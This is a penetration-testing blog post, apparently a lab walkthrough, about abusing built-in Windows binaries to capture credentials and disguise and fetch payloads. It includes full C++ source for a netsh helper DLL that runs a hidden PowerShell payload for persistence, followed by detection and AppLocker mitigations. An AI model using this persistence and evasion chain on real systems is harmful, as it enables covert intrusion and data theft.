---
description: With Windows Binaries
---

# Living Off the Land

Oct 20, 2018

## Living Off the Land

Posted in [Pentesting](https://liberty-shell.com/sec/category/pentesting)

### With Windows Binaries <a id="with-windows-binaries"></a>

A naturally-aspirated approach focusing on the use of native built-in binaries to exploit and persist on target systems. Avoiding detection is a constant battle, so what’s the harm in using trusted built in tools?

Although some binaries have little documentation and take a bit of massaging to work with, there are plenty of benefits, from application white listing to remote file retrieval. First, I’d highly recommend to checkout a few sources first.

* **A recent release of the** [LOLBAS project](https://github.com/LOLBAS-Project/LOLBAS)
* **Solid intro into this approach** – [DerbyCon2013 presentation](https://www.youtube.com/watch?v=j-r6UonEkUw0)
* **Talk on LOLBins with some great examples** - [DerbyCon2018 presentation](http://www.irongeek.com/i.php?page=videos/derbycon8/track-1-01-lolbins-nothing-to-lol-about-oddvar-moe)
* **A great blog showcasing LOLBins** – [Hexacorn](http://www.hexacorn.com/blog/category/living-off-the-land/)

This approach sparked my interested, so I decided to map out a lab scenario. The primary goal of this post is to show off the capabilities of LOLBins vs the practicality of the scenario. PowerShell can accomplish most of the scenario objectives, but I’ll avoid this route as it’s already heavily documented and seems to be more commonly targeted by defensive countermeasures.

These LOLBin examples will be focused on persistence at a beginner/intermediate level.

### Scenario: <a id="scenario"></a>

You’ve gained access to a public facing IIS server with Domain credentials ran by ACME. From here, you wish to pivot onto the ACME CEO’s machine CALVIN. For simplicity we’ll assume we have a secure RDP connection to the IIS server. Again, these examples are simply showcasing what you can accomplish by Living Off the Land.

### IIS & File Share <a id="iis--file-share"></a>

You’re on a webserver owned by ACME and you start poking around and find a locally hosted file share - \SUPERSTITIONS\share. In this example we will avoid digging around in the share, opening any files we don’t have permissions to.

#### Packet Capture <a id="packet-capture"></a>

One alternative option would be to capture packets on the local share using **Netsh**. This built-in binary provides significant capabilities to interact with the network, including packet capture locally or on remote file shares.

I didn’t have any luck capturing activity on a remote share, so in this case we’ll start out capturing local packets, outputting to an ETL file.

```text
C:\>netsh.exe trace start capture=yes filemode=append persistent=yes \
tracefile=C:\Users\Public\file2.etl IPv4.Address=!(127.0.0.1)
```

We are capturing on the local IIS box, and outputting as an ETL file to `C:\Users\Public\file2.etl`. To end the packet capture, execute `netsh trace stop`

I’m new to drilling down into ETL files, and found the simplest way to investigate is through [Microsoft’s Message Analyzer](https://www.microsoft.com/en-us/download/details.aspx?id=44226) tool. Another option is to use **logman.exe**, or convert the etl to pcap for wireshark. In our case we’ll open the .etl in MS Message Analyzer.

#### Trace program: running <a id="trace-program-running"></a>

MS Message Analyzer has some nifty bells and whistles, including filter capabilities. Diving into the functionalities and filtering options is out of scope for this blog post, but after a quick superficial glance, SMB2 is observed as a _Module_ being ran.

![alt text](https://liberty-shell.com/sec/assets/img/packetcap1.png)

Diving deeper into these SMB traces, a new source IP is found along with a file named **accounts.txt**. It seems this file is being opened and written to. Using a simple string in the “Find Message” text box as `Summary contains accounts.txt` we can investigate each message, checking for the buffer value…

One message in particular seems to stand out…

![alt text](https://liberty-shell.com/sec/assets/img/packetcap3.png)

Do you see anything juicy in this message? The contents of the text file is being read by the buffer, including precious credentials. In reality the \SUPERSTITIONS\share\accounts.txt file was opened remotely from CALVIN’s machine.

### CALVIN <a id="calvin"></a>

We’ve gained valid user credentials and have “stealthily” RDP’d onto CALVIN’s machine. If we wanted to avoid RDP another option could be to check if WinRM is enabled. If so we could attempt to execute PowerShell Remotely \(or wmi, psexec, etc\) by using `PSSession` or `Invoke-Command`

```text
PS C:\> Enter-PSSession -ComputerName calvin -Credential acme\calvin    
PS C:\> Invoke-Command -ComputerName calvin -ScriptBlock {ipconfig} -Credential acme\calvin
```

So we’re on CALVIN and we are connected via RDP - what are the next steps? Maybe pivot some more, exfil data and/or maintain persistence? We’ll start by maintaining persistence.

There are methods to go “fileless”, [executing commands in memory pulled from the web](https://www.sans.org/summit-archives/file/summit-archive-1524493093.pdf), stored as objects, etc but in this example I’ll stick to a basic powershell reverse shell one-liner.

**PowerShell blues**

It’s fairly common for attackers and attacking frameworks to encode payloads with base64 in order to obfuscate itself from intrusion detection. As many know, PowerShell can encode, decode or execute an encoded command. This vector has become much more prevalent and [companies are picking up on ways to mitigate this threat](https://www.fireeye.com/blog/threat-research/2018/07/malicious-powershell-detection-via-machine-learning.html)

### Certutil.exe <a id="certutilexe"></a>

Certutil is a great little binary that can download remote files, create certificates, or encode files. Not only can this built-in exe encode a file to base64, it can also encode into hex. When encoding to b64, it includes the certificate header and footer, which one may find convincing.

```text
-----BEGIN CERTIFICATE-----
B64 Encoded Junk that looks 
like a real certificate.
-----END CERTIFICATE-----
```

When decoding with certutil, it will remove the header and footer, providing you with the original file. Now, to obfuscate we’ll encode the payload locally \(on attacking machine\) through certutil as base64. Then again through hex and once again through base64.

```text
certutil -encode payload.txt vpn.crt
certutil -f -encodehex vpn.crt vpn.crt
certutil -f -encode vpn.crt vpn.crt
```

This should give us a nice bogus looking “certificate.” It’s also worth noting I attempted to use **assoc.exe** to allow .crt to execute as PowerShell without luck. Would be nice if PowerShell could execute the encoded “certificate” .crt file.

Now that the encoded PowerShell payload is set on our machine, we’ll need to move it over to CALVIN. It’s worth noting, CALVIN is running Windows 10 with the latest updates from Windows Defender.

Using certutil we can test the waters by remotely downloading a simple file on CALVIN from the attackers IP.

```text
C:\>certutil –urlcache –split –f http://192.168.1.11/index.html index.html
```

#### Busted! <a id="busted"></a>

After executing, **Windows Defender catches this** as malicious activity. Trying a few other extensions also fail, of course.

```bash
Trojan:Win32/Ceprolad.A

Aler level: Severe
Status: Active

CmdLine:\Device\HarddiskVolume2\Windows\System32\certutil.exe certu
–urlcache –split –f http://192.168.1.11/index.html
```

### hh.exe to the Rescue <a id="hhexe-to-the-rescue"></a>

Another option besides using a _conventional_ web browser, is [**hh.exe**](https://github.com/LOLBAS-Project/LOLBAS/blob/master/OSBinaries/hh.exe.md). Using this binary we can go to a quick test page on our attacking machine to see what it’s made of.

![alt text](https://liberty-shell.com/sec/assets/img/hh1.gif)

Great, looks like this may be an option, but what’s really the difference besides using Internet Explorer? _Luckily_ the target machine had [TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview) installed. We open TCPView and execute hh.exe, pointing to our attacking machine once again.

![alt text](https://liberty-shell.com/sec/assets/img/hhexe.png)

Nothing out of the ordinary, hh.exe process starts and calls out to the remote IP. It’s possible ie.exe may raise more red flags than hh.exe, so we’ll go with hh.exe - this time pointing to our **payload.txt** file

![alt text](https://liberty-shell.com/sec/assets/img/payhh.png)

It’s a pretty large “certificate”, but may not raise any flags unless it’s manually viewed by a sysadmin. Now we can open notepad, copy the text and save as something unsuspicious. As to avoid any permission issues we’ll save as

```text
C:\Users\Public\vpn.crt
```

Wait, what if we wanted to use a custom .EXE for our payload using C\#? You could use the same hh.exe process, copy to a .cs file and use the [LOLBin of **csc.exe**](https://github.com/LOLBAS-Project/LOLBAS/blob/master/OSBinaries/Csc.exe.md) to compile into an EXE \(or DLL\).

## Maintaining Persistence <a id="maintaining-persistence"></a>

Now that the payload is obfuscated on the target machine, we’ll need to find a way to execute it. Run keys, etc are an option, but netsh comes to mind again. NetSh loads **helper dll’s** to help its functionality.

A malicious user could create a bogus dll and load it into netsh, causing this dll to run every time netsh.exe was executed - I recently [posted](https://liberty-shell.com/sec/2018/07/28/netshlep/) about this process and created a basic [POC](https://github.com/rtcrowley/Offensive-Netsh-Helper/blob/master/netshlep.cpp) - which the below .cpp is based off of.

In order to convert the bogus **.crt** file, the process to decode & execute can be all within the dll or externally like a batch file, reg key, etc. This example will include an all-inclusive dll. Realistically, an attacker may simply add the payload within this dll as to avoid dropping an extra file, except this isn’t the point of the blog post.

### NetSh Helper <a id="netsh-helper"></a>

One reason an attacker may use netsh helpers to maintain persistence is due to the prevalence of users working remotely. [VPN’s are known to execute netsh commands while running](https://support.hidemyass.com/hc/en-us/articles/216781858-How-to-fix-NETSH-Error). Even if a user is working on-site, some networks may only allow a VPN to access other network resources.

In the scenario of a C-level employee working from home, an attacker could load the dll\(payload\) » Execute payload on VPN start-up » Save sensitive files locally » Create script to exfil via home network once payload \(netsh/VPN\) disconnects, avoiding any corporate detection methods.

The source code executes certutil to run the decode process and powershell to execute the payload in memory. There could be a few other ways of doing this, but my focus was to execute all in-memory. The **%YAH%** file does not exist, and doesn’t write to the directory - at least according to a once-over within Event Logs.

[netshade.dll C++ source](https://github.com/rtcrowley/living-off-the-land/blob/master/netshade.cpp):

```cpp
#include <stdio.h>
#include <windows.h>

DWORD WINAPI YahSure(LPVOID lpParameter)
{
   system("@echo off && SET YAH=C:\\Users\\Public\\cisco.ps1 && \
    FOR %Y IN (C:\\Users\\Public\\vpn.crt) DO certutil -f -decode %Y %YAH% >nul 2>nul && \
    FOR %A IN (%YAH%) DO certutil -f -decodehex %A %YAH% >nul 2>nul && \
    FOR %H IN (%YAH%) DO certutil -f -decode %H %YAH% >nul 2>nul && \
    start powershell.exe -win hidden -nonI -nopro $bang = Get-Content %YAH%; del %YAH%; Invoke-Expression $bang");

   return 1;
}

//Custom netsh helper format
extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)
{
    HANDLE hand;
    hand = CreateThread(NULL, 0, YahSure, NULL, 0, NULL);
    CloseHandle(hand);

    return NO_ERROR;
}
```

When executing netsh or adding the helper, a powershell prompts briefly. I’m sure someone with better knowledge of C++ and/or PowerShell could stop this.

Nothing was flagged when scanning with Windows Defender or Malewarebytes, nor was the execution of the payload via netsh flagged.

![alt text](https://liberty-shell.com/sec/assets/img/shell.gif)

An attacker could avoid sending the reverse shell directly back to its controlled ip, and configure port redirection via **netsh portproxy** to sieve through the web server. This may avoid network defense countermeasures as it’s a public facing server with plenty of traffic going in and out.

An attacker could go another route and exfil data from CALVIN onto the share, then pull from the web server via GET/POST requests.

## Mitigation <a id="mitigation"></a>

It’s a definite challenge detecting and mitigating LOL-type attacks. Besides having proper NIDS, HIPS, etc configured, there are a couple extra options I’ll go over.

#### Hash the Helpers <a id="hash-the-helpers"></a>

One method to detect non-default netsh helpers would be to **hash** the netsh registry keys and compare them to a secure baseline. The helper dll’s are listed in the registry here: **HKLM\Software\Microsoft\NetSh**

This batch script will create _helpers.txt_ listing all of the loaded helper dll’s, along with a hash value of the _helpers.txt_ in _hash.txt_ using **reg query** and **certutil**. PowerShell also has a FileHash cmdlet which is commented in the script below.

```bash
@echo off
reg query HKLM\Software\Microsoft\NetSh>out.txt
FOR /F "tokens=3 delims= " %%B IN (out.txt) DO ECHO %%B>>helpers.txt
del out.txt
REM powershell Get-FileHash helpers.txt -algo MD5
certutil -hashfile helpers.txt MD5>>hash.txt
```

This is simply an example. You could create your corps valid hashes, set them as variables, then run the hash.txt against multiple conditionals based off the Windows OS version. eg: _if Hash.txt contains %varValidWin10Hash% echo valid»results.csv_

#### AppLocker Whitelisting <a id="applocker-whitelisting"></a>

Drilling down into whitelisting native apps/binaries could be a headache within a larger Enterprise, but seems to be the way to go if implemented properly.

In the case of our scenario, do users at ACME absolutely need powershell, certutil, etc? In some cases these built-in apps are necessary, but are all of them? Sounds like another case of Least Privilege.

In order to locally Deny CertUtil by an AppLocker Whitelisting rule:

* Run » gpedit.msc
* Computer Configuration » Win. Settings » Sec. Setting » App. Control Pol. » AppLocker
* Right-Click » Properties » Enable all rules collections
* Right-Click » Executable Rules » Create Default Rules
* Add Exception to “All files locate in the Windows folder” » Add Path to certutil.exe
* Apply, restart and make sure Application Identity Service is running

Go through this process with other simple built-in binaries that aren’t needed. Otherwise you could [Deny PowerShell](https://www.sixdub.net/?p=367) within AppLocker.

Although, a dedicated attacker could hack around application whitelisting….of course by using LOL bins, so look at whitelisting as another layer in _defense in depth_.

#### Conclusion <a id="conclusion"></a>

There are incredible opportunities within LOLBins, and it appears these [attacks are only increasing](https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf). More ways to hack these binaries are still being released, so stay privy of these vectors and open to alternate defense strategies.

{% embed url="https://liberty-shell.com/sec/2018/10/20/living-off-the-land/" caption="" %}

